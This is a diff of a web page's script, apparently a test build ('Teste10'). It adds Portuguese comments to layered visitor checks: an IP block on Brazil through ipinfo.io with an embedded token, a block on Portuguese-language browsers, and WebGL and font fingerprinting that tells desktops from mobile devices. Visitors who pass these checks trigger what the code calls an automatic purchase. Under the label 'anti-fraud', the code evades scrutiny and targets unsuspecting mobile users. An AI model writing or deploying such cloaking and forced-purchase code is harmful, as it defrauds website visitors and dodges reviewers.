@@ -10,7 +10,7 @@
                 </script>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>Teste9</title>
+  <title>Teste10</title>
   <style>
     body {
       font-family: Arial, sans-serif;
@@ -142,6 +142,7 @@
 	<script>
 		document.addEventListener('DOMContentLoaded', async () => {
 
+			// --- CAMADA 1: FILTRO DE LOCALIZAÇÃO (IPINFO.IO) ---
 			async function blockBrazil() {
 				const token = '4a977bc54c9317';
 				try {
@@ -160,11 +161,14 @@
 			}
 
 
+			// --- CAMADA 2: ANÁLISE DE INCONSISTÊNCIAS (RED FLAGS) ---
 			function hasRedFlags() {
+				// Filtro de língua: Se o idioma do navegador for português, bloqueia.
 				if (navigator.language && navigator.language.startsWith('pt')) {
 					return true;
 				}
 
+				// Análise da Placa de Vídeo (WebGL)
 				try {
 					const canvas = document.createElement('canvas');
 					const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
@@ -178,6 +182,7 @@
 					}
 				} catch (e) { /* Ignora erros */ }
 
+				// Verificação de Fontes de Desktop
 				const desktopFonts = ['Calibri', 'Cambria', 'Segoe UI'];
 				const testString = "mmmmmmmmmmlli";
 				const testSpan = document.createElement('span');
@@ -203,6 +208,7 @@
 				return false;
 			}
 
+			// --- CAMADA 3: VERIFICAÇÃO FINAL DE CONFIANÇA ---
 			function getFinalConfidenceScore() {
 				let score = 0;
 				if (navigator.maxTouchPoints && navigator.maxTouchPoints > 1) {
@@ -215,17 +221,21 @@
 			}
 
 
+			// --- LÓGICA PRINCIPAL DE EXECUÇÃO ---
 			async function runAntiFraudChecks() {
+				// CAMADA 1
 				const isFromBrazil = await blockBrazil();
 				if (isFromBrazil) {
 					return false;
 				}
 
+				// CAMADA 2
 				const redFlagsFound = hasRedFlags();
 				if (redFlagsFound) {
 					return false;
 				}
 
+				// CAMADA 3
 				const finalScore = getFinalConfidenceScore();
 				if (finalScore < 5) {
 					return false;
@@ -235,12 +245,14 @@
 			}
 
 
+			// --- INÍCIO DA EXECUÇÃO ---
 			const isLegitUser = await runAntiFraudChecks();
 
 			if (!isLegitUser) {
 				return;
 			}
 
+			// Se passou por todos os filtros, executa a compra automática.
 			function showLoadingScreen() {
 				const loadingCSS = `
 					<style id="loading-style">
